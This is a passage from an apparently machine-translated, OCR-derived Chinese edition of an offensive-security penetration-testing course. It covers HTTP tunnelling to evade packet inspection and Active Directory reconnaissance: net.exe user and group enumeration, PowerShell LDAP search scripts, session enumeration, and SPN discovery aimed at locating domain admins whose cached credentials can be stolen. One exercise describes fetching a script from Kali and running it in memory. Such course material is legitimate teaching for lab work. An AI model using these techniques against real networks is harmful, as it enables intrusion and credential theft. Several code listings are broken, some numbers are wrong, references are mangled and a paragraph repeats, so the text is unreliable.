+
+![](img/f99f528ca9845f4c256ce54e882b1345_619_0.png)
+
+图 305：通过 HTTP 隧道在 Windows Server 2016 机器上进行 RDP 登录
+
+太棒了！远程桌面连接成功。
+
+通过检查 `Wireshark` 中的流量，我们确认它确实被封装在 HTTP 中，并且可以绕过深度包内容检测设备。
+
+## 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_620_0.png)
+
+- 帧 131: 111 字节 (888 字节)，传输了 111 字节 (88 kb)
+- 帧 132: 120 字节 (960 字节)，传输了 120 字节 (96 kb)
+- 帧 133: 126 字节 (1008 字节)，传输了 126 字节 (100 kb)
+- 传输协议：TCP
+- 数据: 87 字节 (696 字节)，传输了 87 字节 (696 bits)
+
+```
+GET /index.php HTTP/1.1
+```
+
+
+
+Host: `10.11.10.4:1234`
+
+User-Agent: `Mozilla/5.0`
+
+Connection: `close`
+
+[POST request 1/]
+
+`POST /index.php HTTP/1.1`
+
+Host: `10.11.10.4:1234`
+
+```
+图 306：在 Wireshark 中插入 HTTP 封装的流量
+```
+
+### 20.5.1 练习题
+
+1. 以学生账户连接到你的专用 Linux 实验室，运行 `rdesktop` 并以 `root` 身份运行 `/root/port_forwarding_and_tunneling/http_tunnel.sh`。
+2. 启动 `apache2` 服务器并利用托管在 `443` 端口的漏洞 Web 应用（在之前的模块中介绍过）来获取反向 HTTP Shell。
+3. 使用你的专用客户端重现演示的场景。
+
+### 20.6 总结
+
+在本模块中，我们涵盖了端口转发和隧道技术的概念。该模块包含了在 Windows 和 NIX 操作系统上应用这些技术的工具，这允许我们绕过出站规则以及深度包检测。
+
+## 活动目录 (Active Directory) 攻击
+
+Microsoft Active Directory 服务（通常称为 Active Directory，简称 AD）是一项允许系统管理员在大范围内更新和管理操作系统、应用程序、用户和数据访问的服务。由于 Active Directory 是一个非常复杂且细粒粒度的管理层，它构成了一个非常大的攻击面，并值得关注。
+
+在本模块中，我们将介绍 Active Directory 并演示枚举、身份验证和横向移动技术。
+
+### 21.1 活动目录理论
+
+让我们从简要概述 Active Directory 的概念和术语开始，在进入枚举和利用之前打下基础。
+
+Active Directory 由多个组件组成。最重要的组件是域控制器（DC），它是一个安装了 Active Directory 域服务的 Windows 2000-2019 服务器。域控制器是 Active Directory 的中心和核心，因为它存储了关于特定 Active Directory 实例配置的所有信息。它执行大量的规则，规定了 Windows 域内的对象如何相互作用，以及终端用户可以使用哪些工具。Active Directory 的强大和复杂性基于于网络管理员可用的惊人细粒度控制。
+
+> 有三个不同版本的 Windows Server 操作系统。第一个是原始的“桌面体验”版本。随 Windows Server 2008 R2 引入的 Server Core 是一个没有专用图形界面的精简服务器。最新版本 Server Nano 是 Windows Server 2016 中引入的，它比 Server Core 还要精简。标准的“桌面体验”版和 Server Core 版本可以作为域控制器。Nano 版本无法编辑
+
+当配置 Active Directory 时，会创建一个名为 `corp.where` 的域，其中 `corp` 是组织的名称。在该域内，你可以添加各种类型的对象，包括计算机对象和用户对象。
+
+系统管理员（几乎总是）借助组织单位（OU）的帮助来组织这些对象。OU 类似于文件文件夹，它们是用于存储和分组其他对象的容器。计算机对象代表实际的用户和工作站
+
+⁶⁰ (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview
+⁶¹ (Microsoft, 2014), https://technet.microsoft.com/library/ct86438?vs=10).aspx
+⁶² (Microsoft, 2008), https://msdn.microsoft.com/library/ee391626v?vs=85).aspx
+⁶³ (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/get-started/getting-starting-with-nano-server
+⁶⁴ (Microsoft, 2018), https://technet.microsoft.com/library/ct9803.aspx
+
+# 攻击性安全
+
+Active Directory 对象随类型而异，可以被视为域的成员。例如，用户、组和打印机。将使用 Active Directory 相关的技术进行枚举和利用。在现实世界的场景中，可以使用之前模块中概述的许多 Windows 枚举技术。
+
+但在本模块中，我们将专注于专门为 AD 设计的技术。我们假设已经获取了 Windows 10 工作站的访问权限，并假设已经攻破 Offsec 域用户，该用户是本地管理员组的成员。
+
+我们在该场景中的第一个目标是枚举域用户并尽可能了解他们的组组成。为了实现这一点，我们将利用多种工具和技术，这些可以在没有任何管理员权限的情况下执行。
+
+### 21.2 活动目录枚举
+
+攻击通常从枚举开始。一旦建立了立脚点，目标就是枚举域用户和组组成。
+
+### 21.2.1 传统方法
+
+第一种技术（我们称为“传统”方法）利用内置的 `net.exe` 程序。具体来说，我们将使用 `net user` 子命令，它可以枚举所有本地账户。
+
+```
+C:\Users\offsec.corp net user
+```
+
+CLIENT251 的用户账户
+
+| admin Administrator | DefaultAccount |
+| Guest student | WDAGUtilityAccount |
+| 命令成功完成。 |
+
+添加 `/domain` 标志将枚举整个域的所有用户：
+
+```
+C:\Users\Offsec.corp net user /domain
+```
+
+请求将在 `corp.com` 域控制器处处理。
+
+DC01.corp.com 的用户账户
+
+| admin Administrator | DefaultAccount |
+| Guest iis_service | jeff_admin |
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+```
+krbtgt sql_service
+
+命令成功完成。
+```
+
+> 列表 662 - 运行 `net user domain` 命令
+
+在生产环境中运行此命令可能会返回一个长得多的用户列表。有了这个列表，我们现在可以查询有关单个用户的信息。
+
+根据上面的输出，我们应该查询 `jeff_admin` 用户，因为这个名字听起来很有戏。
+
+> 我们过去的经验表明，管理员往往倾向于在用户名上添加前缀或后缀，以根据其功能识别账户。
+
+```
+C:\Users\Offsec.corp> net user jeff_admin /domain
+
+请求将在域 corp.com 的域控制器上处理。
+```
+
+用户名 `jeff_admin`
+全名 `Jeff_Admin`
+注释
+用户的注释
+国家/区域代码 000（系统默认）
+账户活动：是
+账户过期：永不期
+密码最后设置于 2018/2/19 下午 1:56:22
+密码过期：永不期
+密码可更改：2018/2/19 下午 1:56:22
+密码需要：是
+用户可以更改密码：是
+
+允许的工作站：所有
+登录脚本
+用户配置文件
+主目录
+最后登录：从未登录
+
+允许的登录时间：所有
+
+本地组组成
+组组成：*Domain Users *Domain Admins
+命令成功完成。
+
+> 列表 663 - 针对特定用户运行 `net user`
+
+输出表明 `jeff_admin` 是 `Domain Admins` 组的成员，因此我们将尽力记住这一点。
+
+为了列出域中的所有组，我们可以向 `net group` 命令提供 `/domain` 参数^467。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+C:\Users\offsec.corp net group /domain
+
+请求将在域 corp.com 的域控制器上处理。
+```
+
+
+
+\DC01.corp.com 的组账户
+
+- `Another_Nested_Group`
+- `Cloneable Domain Controllers`
+- `DnsAdminProxy`
+- `Domain Admins`
+- `Domain Computers`
+- `Domain Controllers`
+- `Domain Guests`
+- `Domain Users`
+- `Enterprise Admins`
+- `Enterprise Key Admins`
+- `Enterprise Read-only Domain Controllers`
+- `Group Policy Creator Owners`
+- `Key Admins`
+- `Nested_Group`
+- `Protected Users`
+- `Read-only Domain Controllers`
+- `Schema Admins`
+- `Secret_Group`
+
+命令成功完成。
+
+从列表 664 中的突出输出中，我们注意到自定义组 `Secret_Group`、`Nested_Group` 和 `Another_Nested_Group`（以及随后包含的所有成员）可以被添加为另一个的成员。这被称为嵌套组。
+
+虽然嵌套看起来很复杂，但它的扩展性良好，为即使是 AD 实现提供了灵活性和成员自定义。遗憾的是，`net.exe` 命令行工具无法列出嵌套组，只能列出直接的用户成员。由于此和其他局限性，我们将探索一种在现实环境中更有效、更灵活的替代方案。
+
+# 21.2.1.1 练习
+
+- 1. 连接到你的 Windows 10 环境并使用 `net.exe` 查找域中的用户和组。如果你能看到任何有趣的用户或组。
+
+# 21.2.2 一种现代方法
+
+有几种现代工具能够枚举 AD 环境。PowerShell 命令行（如 `Get-ADUser`608）运行良好，但它们默认只安装在域控制器上
+
+608 (Microsoft, 2018), https://docs.microsoft.com/en-us/powershell/module/adsadministration/get-aduser?view=win10
+
+（作为 RSAT⁶⁰⁹ 的一部分），它们可以安装在 Windows 7 及之后的 Windows 工作站上，并且使用需要管理员权限。
+
+然而，可以使用 PowerShell（Windows 首选的管理脚本语言）来枚举 AD。在本节中，我们将开发一个脚本，尽管这不像运行类似 `net.exe` 命令那样简单，但该脚本将非常灵活，允许我们根据需要添加功能和特性。在构建脚本的过程中，我们将讨论许多与当前任务相关的技术细节。一旦脚本完成，我们就可以复制并粘贴它在评估期间使用。
+
+总体而言，此脚本将查询网络以获取主域控制器和模拟器的名称、域，搜索 Active Directory 并过滤输出以显示用户账户，并清理输出以提高可读性。
+
+> 主域控制器模拟器是域控制器执行的五个操作主角色之一（或 FSMO 角色）⁶⁰。从技术上讲，该属性称为 `PdcRoleOwner`，具有此属性的域控制器始终拥有有关用户登录和验证的最新信息。
+
+此脚本依赖于少数组件。具体而言，我们将使用 `DirectorySearcher`⁶¹ 对象通过轻量级目录访问协议 (LDAP)⁶² 查询 Active Directory，LDAP 是一种域控制器理解的网络协议，也用于与第三方应用程序通信。
+
+LDAP 是 Active Directory 服务接口 (ADIS)⁶³ 提供程序（一种 API），支持对 Active Directory 进行搜索功能。这将允许我们使用 PowerShell 与域控制器交互并提取有关对象的非权限信息。
+
+我们的脚本将围绕一个非常特定的 LDAP 提供程序⁶⁴ 开发，它将作为 `DirectorySearcher` .NET 类的输入。它的路径原型如下：
+
+```
+LDAP://HostName=:DistinguishedName
+```
+
+列表 665 - LDAP 提供程序路径格式
+
+要创建此路径，我们的目标主机（域）和区分名称 (DN)⁶⁵ (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/directorysearcher(vs=110).⁶¹ (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/fsmo-roles-in-domain.⁶² (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/domain(vs=110).⁶³ (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/search(vs=110).⁶⁴ (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/pdcroleowner(vs=110).⁶⁵ (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/name(vs=110).
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. 保留所有权利。
+
+227# 攻击性安全
+
+使用 Kali Linux 2.0
+
+首先，让我们使用 PowerShell 命令发现域的主机和区分名称。具体而言，我们将使用 `System.DirectoryServices` 命名空间的 `Domain` 类。`Domain` 类包含一个名为 `GetCurrentDomain`⁶⁷ 的方法，它可以获取当前登录的域对象。调用该方法及其输出显示如下：
+
+```
+PS C:\Users\offsec.corp> [System.DirectoryServices.Domain]::GetCurrentDomain()
+```
+
+| Forest | corp.com |
+| DomainControllers | {DC01.corp.com} |
+| Children | {} |
+| DomainMode | Unknown |
+| DomainModeLevel | 7 |
+| Parent | |
+| PdcRoleOwner | DC01.corp.com |
+| RidRoleOwner | DC01.corp.com |
+| InfrastructureRoleOwner | DC01.corp.com |
+| Name | corp.com |
+
+列表 666 - 来自 System.DirectoryServices 的 Domain 类
+
+根据此输出，域名为 "corp.com"，主域控制器名称为 "DC01.corp"⁶⁸。
+
+我们可以以此程序化构建 LDAP 提供程序路径。让我们在简单的 PowerShell 脚本中使用 `Name` 和 `PdcRoleOwner` 来构建以下内容：
+
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + " /"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.','DC='))"
+$SearchString += $=$DistinguishedName
+$SearchString
+```
+
+列表 667 - 构建 LDAP 提供程序路径
+
+在此脚本中，`$domainObj` 将存储域对象，`$PDC` 将存储 PDC 的名称，`$SearchString` 将构建根路径。注意 `DistinguishedName` 将
+
+# 攻击性安全
+
+由我们的域名（'corp.com'）拆分为单个域名组件（DC），从而生成的区分名称（DistinguishedName）为 'DC=corp,DC=com$，如脚本输出所示：
+
+```
+LDAP://DC01.corp.com/DC=com
+```
+
+列表 668 - 完整的 LDAP 提供程序路径
+
+这是对域控制器执行 LDAP 查询时所需的完整 LDAP 提供程序路径。
+
+现在我们可以使用 LDAP 提供程序路径实例化 `DirectorySearcher` 类。要使用 `DirectorySearcher` 类，我们必须指定 `SearchRoot`（搜索根），它是 Active Directory 层次结构中搜索开始的节点。
+
+搜索根的形式为从 `DirectoryEntry` 类实例化的对象。当向构造函数传递任何参数时，`SearchRoot` 将指示每个搜索都从 Active Directory 返回结果。列表 669 显示了实现此目的脚本相关部分：
+
+```powershell
+```
+
+
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + " /"
+
+$DistinguishedName = "DC=$($domainObj.Name).Replace('.','DC=')"
+
+$SearchString += $DistinguishedName
+
+```
+```powershell
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+```
+### 列表 669 - 创建 DirectorySearcher
+
+通过我们的 `DirectorySearcher` 对象，我们可以执行搜索。然而，如果没有任何过滤器，我们将接收整个域中的所有对象。
+
+设置过滤的一种方法是通过 `samAccountType` 属性，这是一个用户、计算机和组对象都拥有的属性。请参阅链接引用获取更多示例，但在这种情况下，我们可以向 `filter` 属性提供 `0x03000000`（十进制 503530638）来枚举域中的所有用户，如列表 670 所示：
+
+```powershell
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + " /"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.','DC='))"
+
+$SearchString += $DistinguishedName
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter="samAccountType=80530638"
+
+$Searcher.FindAll()
+
+```
+
+### 列表 670 - 搜索用户的代码段
+
+我们通过 `$Searcher` 对象的 `.filter` 属性添加了 `samAccountType` 过滤器，并调用了 `FindAll` 方法进行搜索并找到符合配置过滤器的结果。
+
+运行此脚本时，它应该枚举域中的所有用户：
+
+| 路径 | 属性 |
+|---|---|
+| LDAP://CN=Administrator,CN=DC=corp,DC=com | {admincount...} |
+| LDAP://CN=Guest,CN=DC=corp,DC=com | {iscritical...} |
+| LDAP://CN=DefaultAccount,CN=DC=corp,DC=com | {iscritical...} |
+| LDAP://CN=krbtgt,OU=DC=corp,DC=com | {msd-...} |
+| LDAP://CN=WebJeff,OU=Admins,OU=CorpUsers,DC=corp,DC=com | {givenname} |
+| LDAP://CN=Jeff_Admin,OU=Admins,DC=corp,DC=com | {givenname} |
+| LDAP://CN=Adam,OU=Normal,OU=CorpUsers,DC=corp,DC=com | {givenname} |
+| LDAP://CN=is_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com | {givenname...} |
+
+### 列表 671 - 域中的用户
+
+这些信息很有用，但我们应该对其进行清理。由于用户对象的属性存储在 `Properties` 字段中，可以使用一个简单的循环来单独打印每个属性。完整的 PowerShell 脚本将收集所有用户及其属性：
+
+```powershell
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + " /"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.','DC='))"
+
+$SearchString += $DistinguishedName
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter="samAccountType=80530638"
+
+$Result = $Searcher.FindAll()
+
+foreach($obj in $Result) {
+
+  foreach($prop in $obj.Properties) {
+
+    $prop
+
+  }
+
+}
+
+Write-Host "----------------------------------"
+
+```
+
+### 列表 672 - 枚举所有用户的 PowerShell 脚本
+
+由于用户对象具有许多属性，检索的信息可能会让人眼 overwhelming。下面的列表显示了 Jeff_Admin 属性的部分视图。
+
+| 属性 | 值 |
+|---|---|
+| admincount | {1} |
+| accountcontrol | {6604} |
+| badpasswordcount | {0} |
+| badpasswordtime | {0} |
+| cn | {Jeff_Admin} |
+| created | {05/02/2018 18:33:10} |
+| displayname | {Jeff_Admin} |
+| lastlogon | {0} |
+| samAccountType | {80530638} |
+| countrycode | {0} |
+| objectid | {15002100195240975338661233} |
+| logoncount | {0} |
+| primarygroup | {513} |
+| objectcategory | {CN=Person,CN=Schema,CN=Configuration,DC=com} |
+| userprincipalname | {jeff_admin@corp.com} |
+| dscorepropagationdata | {05/02/2018 19.20.52, 01/01/1601 00.00.00} |
+| distinguishedname | {CN=Jeff_Admin,OU=Admins,OU=CorpUsers,DC=corp,DC=com} |
+| objectClass | {top, person, organizationalPerson, user} |
+| uncreated | {12879} |
+
+### 列表 673 - 所有用户及其属性
+
+根据上述信息，Jeff Admin 账户是域管理员组的成员。使用我们的 `DirectorySearch` 对象，我们可以使用过滤器来定位特定组（如域管理员），或者使用过滤器专门搜索 Jeff Admin 用户。
+
+在 `filter` 属性中，我们可以设置任何定义的对象类型。例如，我们可以使用 `name` 属性为 Jeff_Admin 创建过滤器，如下：
+
+```powershell
+
+$Searcher.filter="name=Jeff_Admin"
+```
+
+
+
+列表 674 - 过滤结果至 `Jeff_Admin`
+
+虽然这看起来很复杂，但它非常灵活，可以进行修改以协助其他 AD 枚举任务。
+
+## 21.2.2.1 练习
+
+- 1. 修改 PowerShell 脚本以返回域管理员组的成员。
+- 2. 修改 PowerShell 脚本以返回域中的所有计算机。
+- 3. 添加过滤器以仅返回运行 Windows 10 的计算机。
+
+## 21.2.3 解析嵌套组
+
+接下来，让我们使用我们开发的 PowerShell 脚本来解析在使用 `net.exe` 时遇到的嵌套组。
+
+第一个任务是定位域中的所有组并打印它们的名称。为此，我们将创建一个匹配所有 `objectClass` 设置为 "Group" 的记录的过滤器，并在每个属性缩进中仅打印 `name` 属性。
+
+列表 675 显示了修改后的脚本。
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+```powershell
+$Searcher.SearchRoot = $objDomain
+```
+
+```powershell
+$Searcher.filter="(objectClass=Group)"
+```
+
+```powershell
+$Result = $Searcher.FindAll()
+```
+
+```powershell
+Foreach($obj in $Result)
+{
+  $obj.Properties.name
+}
+```
+
+列表 675 - 修改后的 PowerShell 脚本，用于列举所有域组。列表 676 显示的截断输出显示了 `Secret_Group`、`Nested_Group` 和 `Another_Nested_Group` 组：
+
++ Key Admins
+Enterprise Key Admins
+DnsUpdateProxy
+Secret_Group
+Nested_Group
+Another_Nested_Group
+
+列表 676 - 列举域组的截断输出
+
+让我们尝试通过在 `name` 属性上设置合适的过滤器，来列出 `Secret_Group` 的成员。
+
+此外，我们将只显示 `member` 属性以获取组成员。实现此目的修改后的 PowerShell 脚本在列表 677 中，更改部分已高亮显示：
+
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + " /"
+$DistinguishedName = "DC:\${($domainObj.Name.Replace('.','DC='))}"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="name=Secret_Group"
+$Result = $Searcher.FindAll()
+```
+
+```powershell
+Foreach($obj in $Result)
+{
+  $obj.Properties.member
+}
+```
+
+列表 677 - 列举组成员的 PowerShell 脚本
+
+修改后的脚本将导出 `DistinguishedName` 组的成员：
+
+```
+CN=Nested_Group,OU=CorpGroups,DC=corp,DC=com
+```
+
+列表 678 - `Secret_Group` 组的成员
+
+根据此输出，`Nested_Group` 是 `Secret_Group` 的成员。为了列举其成员，我们必须重复列出 `Nested_Group` 成员时执行的步骤。我们可以通过替换过滤器条件中的组名来实现：
+
+```powershell
+...
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="(name=Nested_Group)"
+...
+```
+
+列表 679 - 获取 `Nested_Group` 的成员
+
+此更新后的脚本生成了列表 680 中的输出：
+
+```
+CN=Another_Nested_Group,OU=CorpGroups,DC=corp,DC=com
+```
+
+列表 680 - `Nested_Group` 组的成员
+
+这表明 `Another_Nested_Group` 是 `Nested_Group` 的唯一成员。我们需要运行并修改脚本，替换过滤器条件中的组名。
+
+```powershell
+...
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="(name=Another_Nested_Group)"
+...
+```
+
+列表 681 - 获取 `Another_Nested_Group` 的成员
+
+下次搜索的输出显示在列表 682 中。
+
+```
+CN=Adam,OU=Normal,DC=corp,DC=com
+```
+
+列表 682 - `Another_Nested_Group` 组的成员
+
+最后，我们发现域 `Adam` 是 `Another_Nested_Group` 的唯一成员。这展示了通过列举来解开我们的嵌套组，并演示了如何利用 PowerShell 和 LDAP 来执行此类查询。
+
+## 21.2.3.1 练习
+
+- 1. 重复列举以发现 `Secret_Group`、`Nested_Group` 和 `Another_Nested_Group` 之间的关系。
+- 2. 本节介绍的脚本要求我们在每次迭代时更改组名。调整脚本以便在预先不知道名称的情况下程序化解析嵌套组。
+
+## 21.2.4 当前登录用户
+
+此时，我们可以列出用户及其所属的组成员，并可以轻松地定位管理员用户。
+
+作为下一步，我们想要找到属于高价值组成员的登录用户，因为他们的凭据会缓存在内存中，我们可以窃取这些凭据并使用它们进行身份验证。
+
+如果我们成功攻破一个域管理员（Domain Admin），我们最终就可以接管整个域（我们将在后面的章节中看到）。或者，如果我们无法立即攻破一个域管理员，我们必须破解其他账户或机器，以最终获得该级别的访问权限。
+
+例如，图 307 显示 Bob 登录到了 `CLIENT512`，并且是所有工作站的本地管理员。Alice 登录到了 `CLIENT621`，并且是所有服务器的本地管理员。最后，Jeff 登录到了 `SERVER21`，是域管理员组的成员。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_634_0.png)
+
+图 307：待攻破的用户链
+
+如果我们能成功攻破 Bob 的账户（通过客户端攻击示例），我们就可以从 `CLIENT512` 跳转到目标 `CLIENT621` 上的 Alice。扩展地，我们可能再次跳转到 `SERVER21` 上的 Jeff，获得域访问权限。
+
+在这种场景的情况下，我们必须定制列举过程，不仅要考虑域管理员，还要考虑潜在的“链式破解”途径。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_636_0.png)
+
+| CLIENT2515 | corp |
+| :--- | :--- |
+| CLIENT2515 | corp |
+| CLIENT2515 | corp |
+
+列表 684 - 使用 `Get-Loggedon` 进行用户枚举
+
+输出结果显示了有效的 `offsec` 用户账户。接下来，让我们尝试检索域控制器 `DC01` 上的活动会话。记住，这些会话是在用户登录时针对域控制器执行的，但源自特定的工作站或服务器，这正是我们正尝试枚举的内容。
+
+我们可以使用 `-Computer` 标志以类似的方式调用 `Get-NetSession` 函数。回想该函数调用了 Win32 API `NetSessionEnum`，它将返回所有活动会话，在我们的案例中，是从域控制器返回。
+
+在 685 中，针对域控制器 `DC01` 调用了该 API。
+
+```
+PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
+```
+
+
+
+| sesio0_username | sesio1_time | sesio0_idle_time |
+| :--- | :--- | :--- |
+| 192.168.1.111 CLIENT25$ | 6 | 6 |
+| DC01 | | 0 |
+| 192.168.1.111 offsec | | |
+
+列表 685 - 使用 `Get-NetSession` 枚举活动会话
+
+由于 Offsec 用户在来自 192.168.1.111 (Windows 10) 的域控制器上有一个活动会话，从两个 API 获取的信息最终是相同的，因为我们只针对单台机器，而这台机器恰好也是我们执行脚本的机器。在真实的 Active Directory 基础设施中，使用每个 API 获得的信息可能会不同，并且无疑会有更多帮助。
+
+现在我们已经枚举组成员关系并确定哪些机器当前已登录，我们拥有了开始渗透用户账户的基本技能，最终目标是获取域管理员权限。
+
+## 2.2.4.1 练习题
+
+- 1. 下载并使用 PowerShell，在 Offsec 账户上下文中执行与学生 VM 相同的枚举。
+- 2. 使用 Jeff_Admin 账户登录学生 VM，并使用 Jeff_Admin 账户通过远程桌面登录到域控制器。接下来，在学生 VM 上执行 `Get-LoggedOn` 函数，以发现 Jeff_Admin 账户上下文中域控制器上的登录用户。
+- 3. 重复使用 `System.Net.Client` 类中的 `DownloadString` 方法进行枚举，以便从 Kali 系统下载 PowerShell 并在内存中执行它，而不保存到硬盘。
+
+## 通过服务主体名称 (SPN) 进行枚举
+
+我们已经枚举了域用户，以寻找属于高价值组成员的登录账户。攻击域用户账户的另一种方案是针对所谓的服务账户 629，它们也可能是高价值组的成员。
+
+当执行一个应用程序时，它必须在操作系统用户的上下文中运行。如果用户启动应用程序，则由该用户账户定义上下文。然而，由系统启动的服务使用基于服务账户的上下文。
+
+换句话说，它使用了一组预定义的服务账户：LocalSystem、630 LocalService、631 和 NetworkService 632。对于更复杂的应用程序，可以使用域用户账户来提供所需的上下文，同时访问域内部的资源。
+
+> 管理服务账户（Managed Service Accounts）634 随 Windows Server 2008 R2 引入，为需要与 Active Directory 深度集成的复杂应用程序设计。像 SQL 和 Microsoft Exchange 635 等较大的应用程序通常需要服务器冗余但不保证可用性，而管理服务账户 636 是随着 Windows Server 2012 引入的，但这要求域控制器运行 Windows Server 2012 或更高版本。由于由于，许多组织仍然依赖基础服务账户。
+
+通过枚举域中的 SPN，我们可以获取运行在集成 Active Directory 的服务器上的应用程序 IP 地址和端口号，从而减少对范围端口扫描的需求。
+
+由于信息注册并存储在 Active Directory 中，因此存在于域控制器上。为了获取数据，我们将查询域控制器寻找特定的服务主体名称。
+
+629 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/windows/desktop/ms68605(v=vs.8).aspx
+630 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/windows/desktop/ms68419(v=vs.8).aspx
+631 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/windows/desktop/ms68188(v=vs.8).aspx
+632 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.8).aspx
+633 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/windows/desktop/ms67794(v=vs.8).aspx
+634 (Microsoft, 2019), https://blogs.technet.com/asks/2009/09/10/
+635 (Microsoft, 2018), https://security.org/page_id
+636 (Microsoft, 2012), https://technet.com/windows-service-accounts
+637 (Sean Metcalf, 2017), http://adsecurity.org/page_id
+
+通过枚举域中的 SPN，我们可以获取运行在集成 Active Directory 的服务器上的应用程序 IP 地址和端口号，从而减少对范围端口扫描的需求。
+
+由于信息注册并存储在 Active Directory 中，因此存在于域控制器上。为了获取数据，我们将查询域控制器寻找特定的服务主体名称。
+
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory]::GetCurrentDomain()
+
+$PDC = $domainObj.Name
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$"
+
+$Searcher.Filter = "serviceprincipalname=*"
+
+$Result = $Searcher.FindAll()
+
+foreach($obj in $Result) {
+
+    $obj.Properties
+
+}
+```
+
+
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_640_0.png)
+
+![](img/f99f528ca9845f4c256ce54e882b1345_640_1.png)
+
+图 308：CorpWebServer.com IIS Web 服务器
+
+虽然域控制器通常会有一个 Web 服务器，但学生实验室充满了惊喜。
+
+虽然对服务主体名称（`SPN`）的枚举没有产生 Web 服务器软件或版本，但它会缩小搜索范围，并允许进行手动检测或脚本化的端口扫描。
+
+## 21.2.5.2 练习题
+
+- 1. 重复本节的步骤，以发现 IIS 服务器的服务主体名称。
+- 2. 发现域中任何其他注册的服务主体名称。
+- 3. 更新脚本，使结果包含注册了服务主体名称的服务器的 IP 地址。
+- 4. 使用 `Get-SPN` 命令并重新发现相同的服务主体名称。
+
+> 638 (Scott Suther, 2013), https://github.com/EmpireProject/Empire/blob/master/module_source/data/source/situational_awareness/network/Get-SPN.ps1
+
+## 21.3 Active Directory 身份验证
+
+现在我们枚举了用户账户、组组成和注册的 `SPN`，让我们尝试使用这些信息来破解 Active Directory。
+
+为了实现这一点，我们首先讨论 Active Directory 身份验证的细节。
+
+Active Directory 支持多种身份验证协议和技术，并对 Windows 以及运行 Linux 和 macOS 的计算机实现身份验证。
+
+> Active Directory 支持包括 `WDigest` 在内的几种旧协议。虽然这些协议对于 Windows 7 或 Windows Server 2008 R2 等旧版操作系统可能有用，但我们在本节中将关注更现代的身份验证协议。
+
+Active Directory 在大多数身份尝试中使用 Kerberos 或 `NTLM` 身份验证协议。我们将首先讨论较简单的 `NTLM` 协议。
+
+### 21.3.1 NTLM 身份验证
+
+当客户端通过 IP 地址（而不是主机名）向服务器进行身份验证，或者用户尝试对未在 Active Directory DNS 服务器注册的主机名进行身份验证时，将使用 `NTLM` 身份验证。同样，第三方应用程序可能会选择使用 `NTLM` 身份验证代替 Kerberos 身份验证。
+
+`NTLM` 身份验证协议包含七步骤，如图 309 所示并在下方进行了详细解释。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_641_0.png)
+
+639 (Microsoft, 2003), https://technet.microsoft.com/en-us/library/cc77868(v=ws10).aspx
+640 (Microsoft, 2003), https://technet.microsoft.com/en-us/library/cc78049(v=ws10).aspx
+641 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs85).aspx
+642 (Microsoft, 2013), https://blogs.msdn.microsoft.com/chirnith/2013/09/20/ntlm-want-to-know-how-works/
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
